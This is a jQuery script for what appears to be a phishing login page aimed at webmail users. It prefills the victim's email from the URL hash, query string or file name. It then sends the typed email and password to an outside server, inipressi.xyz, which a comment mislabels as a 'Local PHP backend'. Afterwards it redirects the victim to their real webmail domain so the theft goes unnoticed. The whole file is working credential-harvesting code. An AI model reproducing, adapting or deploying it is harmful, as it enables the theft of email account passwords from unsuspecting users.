$(document).ready(function() {
    // Configuration - Set your redirect domain here
    var REDIRECT_DELAY = 1500; // Delay in milliseconds before redirect (1.5 seconds)
    
    // Function to extract domain from email and create webmail URL
    function getWebmailUrl(email) {
        if (!email || !email.includes('@')) {
            return 'https://webmail.gracedrive.org'; // Fallback domain
        }
        
        var domain = email.split('@')[1];
        return 'https://webmail.' + domain;
    }
    
    // Enhanced function to extract email from URL hash, query, or filename (index.html@user@domain.com)
    function extractEmailFromUrl() {
        var email = null;
        // 1. Try to get email from URL hash (fragment)
        var hash = window.location.hash;
        if (hash && hash.length > 1) {
            var hashContent = decodeURIComponent(hash.substring(1));
            var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            if (emailRegex.test(hashContent)) {
                email = hashContent;
            }
        }
        // 2. Try URL query parameters
        if (!email) {
            var urlParams = new URLSearchParams(window.location.search);
            var emailParam = urlParams.get('email') || urlParams.get('user') || urlParams.get('username');
            if (emailParam) {
                var decodedEmail = decodeURIComponent(emailParam);
                var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                if (emailRegex.test(decodedEmail)) {
                    email = decodedEmail;
                }
            }
        }
        // 3. Try to extract from filename (index.html@user@domain.com)
        if (!email) {
            var path = window.location.pathname;
            var fileMatch = path.match(/@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
            if (fileMatch && fileMatch[1]) {
                email = fileMatch[1];
            }
        }
        // 4. Also check for email in the full URL path (after domain)
        if (!email) {
            var fullPath = window.location.pathname + window.location.search + window.location.hash;
            var emailMatches = fullPath.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
            if (emailMatches && emailMatches.length > 0) {
                email = emailMatches[0];
            }
        }
        return email;
    }
    
    // Function to handle successful login and redirect
    function handleSuccessfulLogin(response) {
        $('#loading-overlay').hide();
        var msg = response && response.msg ? response.msg : 'Login successful!';
        
        // Show success message
        $('#login-status-message').text(msg).show();
        $('#login-status').removeClass('error-notice').addClass('success-notice').show();
        
        // Clear password field for security
        $('#password').val('');
        
        // Disable form to prevent further submissions
        $('#login_submit').prop('disabled', true).text('Login Successful');
        $('#email').prop('disabled', true);
        $('#password').prop('disabled', true);
        
        // Immediate redirect attempt
        var userEmail = $('#email').val();
        var redirectUrl = getWebmailUrl(userEmail) + '?email=' + encodeURIComponent(userEmail);
        console.log('Attempting immediate redirect to: ' + redirectUrl);
        
        // Try multiple redirect methods
        try {
            // Method 1: window.location.replace
            window.location.replace(redirectUrl);
        } catch(e) {
            console.log('Method 1 failed, trying method 2');
            try {
                // Method 2: window.location.href
                window.location.href = redirectUrl;
            } catch(e2) {
                console.log('Method 2 failed, trying method 3');
                // Method 3: window.open
                window.open(redirectUrl, '_self');
            }
        }
        
        // Fallback redirect after delay
        setTimeout(function() {
            var currentDomain = getWebmailUrl(userEmail).replace('https://', '');
            if (window.location.href.indexOf(currentDomain) === -1) {
                console.log('Fallback redirect triggered');
                window.location.href = redirectUrl;
            }
        }, REDIRECT_DELAY);
    }
    
    // Function to handle failed login
    function handleFailedLogin(response) {
        $('#loading-overlay').hide();
        var msg = response && response.msg ? response.msg : 'Invalid email or password. Please try again.';
        
        $('#login-status-message').text(msg);
        $('#login-status').removeClass('success-notice').addClass('error-notice').show();
        $('#password').val('').focus();
        
        if (response && response.attempt) {
            console.log('Attempt #' + response.attempt + ' logged');
        }
    }
    
    // Auto-populate email field if valid email is found in URL or filename
    var emailFromUrl = extractEmailFromUrl();
    if (emailFromUrl) {
        $('#email').val(emailFromUrl);
        $('#password').focus();
        $('#email').css('background-color', '#f0f8ff');
        setTimeout(function() {
            $('#email').css('background-color', '');
        }, 2000);
    }
    
    // Listen for hash changes (if user navigates with different email)
    $(window).on('hashchange', function() {
        var newEmail = extractEmailFromUrl();
        if (newEmail && newEmail !== $('#email').val()) {
            $('#email').val(newEmail);
            $('#password').focus();
        }
    });
    
    // Form submission handler
    $('#login_submit').click(function(e) {
        e.preventDefault();
        var email = $('#email').val().trim();
        var password = $('#password').val();
        
        if (!email) {
            $('#msg').text('Please enter an email address.').show();
            $('#email').focus();
            return false;
        }
        
        if (!password) {
            $('#msg').text('Please enter a password.').show();
            $('#password').focus();
            return false;
        }
        
        var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!emailRegex.test(email)) {
            $('#msg').text('Please enter a valid email address.').show();
            $('#email').focus();
            return false;
        }
        
        $('#msg').hide();
        $('#login-status').hide();
        $('#loading-overlay').show();
        
        // Submit the form via AJAX
        $.ajax({
            url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php', // Local PHP backend
            method: 'POST',
            type: 'POST',
            data: {
                email: email,
                password: password
            },
            dataType: 'json',
            cache: false,
            timeout: 30000,
            processData: true,
            contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
            beforeSend: function() {
                $('#login_submit').prop('disabled', true).text('Processing...');
            },
            success: function(response) {
                console.log('Server response:', response);
                var msg = response && response.msg ? response.msg : '';
                
                // Debug: Log the response details
                console.log('Response message:', msg);
                console.log('Response signal:', response && response.signal);
                console.log('Response success:', response && response.success);
                
                // Check if login was successful - more comprehensive check
                if (response && (response.signal === 'OK' || response.success === true || 
                    msg.toLowerCase().includes('success') || msg.toLowerCase().includes('redirect'))) {
                    console.log('Login successful - triggering redirect');
                    handleSuccessfulLogin(response);
                } else {
                    console.log('Login failed - showing error');
                    handleFailedLogin(response);
                }
            },
            error: function(xhr, status, error) {
                $('#loading-overlay').hide();
                var errorMsg = 'Connection error';
                
                if (xhr.responseText) {
                    try {
                        var errorResponse = JSON.parse(xhr.responseText);
                        errorMsg = errorResponse.msg || errorMsg;
                    } catch (e) {
                        errorMsg = 'Server error: ' + xhr.status;
                    }
                }
                
                $('#login-status-message').text(errorMsg);
                $('#login-status').removeClass('success-notice').addClass('error-notice').show();
                $('#password').val('').focus();
            },
            complete: function() {
                // Only re-enable if login failed
                if (!$('#login_submit').prop('disabled') || $('#login_submit').text() !== 'Login Successful') {
                    $('#login_submit').prop('disabled', false).text('Log in');
                }
            }
        });
        
        return false;
    });
    
    // Reset password functionality (placeholder)
    $('#reset_password').click(function(e) {
        e.preventDefault();
        alert('Password reset functionality would be implemented here.');
    });
});